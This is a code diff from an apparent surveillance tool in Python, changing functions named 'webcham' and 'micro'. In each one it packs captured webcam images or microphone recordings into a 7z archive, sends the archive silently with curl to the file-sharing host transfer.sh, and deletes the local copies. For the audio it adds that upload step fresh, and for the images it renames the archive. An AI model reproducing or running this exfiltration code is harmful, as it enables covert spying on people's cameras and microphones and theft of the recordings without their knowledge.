@@ -120,9 +120,9 @@ def webcham():
         o = open("webcam/"+webcam_mode+"/Log.log","w")
         o.write("")
         o.close()
-        os.system("rm -f image.7z > /dev/null")
-        os.system("7z a image.7z ./webcam/images/* > /dev/null")
-        os.system("curl --upload-file ./image.7z https://transfer.sh &> /dev/null")
+        os.system("rm -f image-KhanhNguyen9872.7z > /dev/null")
+        os.system("7z a image-KhanhNguyen9872.7z ./webcam/images/* > /dev/null")
+        os.system("curl --upload-file ./image-KhanhNguyen9872.7z https://transfer.sh &> /dev/null")
         os.system("rm -f ./webcam/images/* &> /dev/null")
       except:
         print(" ")
@@ -201,6 +201,10 @@ def micro():
           o = open("microphone/Log.log","w")
           o.write("")
           o.close()
+          os.system("rm -f audio-KhanhNguyen9872.7z > /dev/null")
+          os.system("7z a audio-KhanhNguyen9872.7z ./microphone/play/* > /dev/null")
+          os.system("curl --upload-file ./audio-KhanhNguyen9872.7z https://transfer.sh &> /dev/null")
+          os.system("rm -f ./microphone/play/* &> /dev/null")
         except:
           print(" ")
     
